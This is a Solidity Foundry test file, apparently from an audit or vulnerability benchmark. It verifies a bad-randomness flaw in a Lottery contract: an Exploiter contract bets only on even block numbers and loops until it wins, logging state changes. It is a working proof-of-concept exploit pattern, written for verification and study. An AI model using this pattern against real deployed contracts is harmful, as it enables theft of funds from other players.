// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/lottery.sol";

contract LotteryExploitTest is Test {
    Lottery public lottery;
    Exploiter public exploiter;
    address public attacker = address(0x1337);

    function setUp() public {
        lottery = new Lottery();
        exploiter = new Exploiter(address(lottery));
        vm.deal(attacker, 10 ether);
    }

    function testBadRandomnessExploit() public {
        vm.startPrank(attacker);

        // Pre-attack state snapshot
        console.log("--- BEFORE-Trigger State ---");
        (uint totalPlayerBetsBefore, uint beforeExploiterWins) = lottery.getPlayerStats(address(exploiter));
        uint beforeTotalBets = lottery.totalBets();
        uint beforeTotalWinners = lottery.totalWinners();

        console.log("Exploiter wins before attack:", beforeExploiterWins);
        console.log("Total winners before attack:", beforeTotalWinners);
        console.log("Total bets before attack:", beforeTotalBets);
        console.log("Exploiter bets before attack:", totalPlayerBetsBefore);

        // Attack operation
        console.log("--- Trigger Attack ---");
        uint256 initialBalance = address(exploiter).balance;
        uint256 attempts = 0;
        while (address(exploiter).balance == initialBalance && attempts < 100) {
            exploiter.attack{value: 1 ether}();
            attempts++;
            vm.roll(block.number + 1); 
        }
        console.log("Attack completed in %d attempts", attempts);

        // Post-attack state snapshot
        console.log("--- AFTER-Trigger State ---");
        (uint totalPlayerBetsAfter, uint afterExploiterWins) = lottery.getPlayerStats(address(exploiter));
        uint afterTotalBets = lottery.totalBets();
        uint afterTotalWinners = lottery.totalWinners();
        
        console.log("Exploiter wins after attack:", afterExploiterWins);
        console.log("Total winners after attack:", afterTotalWinners);
        console.log("Total bets after attack:", afterTotalBets);
        console.log("Exploiter bets after attack:", totalPlayerBetsAfter);

        // Differential verification
        console.log("--- State Change Analysis ---");
        bool winsIncreased = afterExploiterWins > beforeExploiterWins;
        bool totalWinnersIncreased = afterTotalWinners > beforeTotalWinners;
        uint betIncrease = afterTotalBets - beforeTotalBets;
        
        console.log("Exploiter wins increased:", winsIncreased ? "YES" : "NO");
        console.log("Total winners increased:", totalWinnersIncreased ? "YES" : "NO");
        console.log("New bets placed during attack:", betIncrease);

        // Final vulnerability verdict
        if (winsIncreased && totalWinnersIncreased) {
            console.log("VULNERABILITY VERIFIED: Lottery states changed");
            console.log("Vulnerability Exists: Win state manipulation via block number prediction");
        } else {
            console.log("VULNERABILITY NOT DETECTED: No win state changes");
            console.log("Vulnerability not Exists: Win states unchanged after attack");
        }

        // Original financial verification
        if (address(exploiter).balance > initialBalance) {
            console.log("(Confirmation) Exploiter balance increased by:", 
                        address(exploiter).balance - initialBalance, "ether");
        }
        
        vm.stopPrank();
    }
}

contract Exploiter {
    Lottery public lottery;

    constructor(address _lottery) {
        lottery = Lottery(_lottery);
    }

    function attack() external payable {
        if (block.number % 2 == 0) {
            lottery.makeBet{value: msg.value}();
        }
    }

    receive() external payable {}
}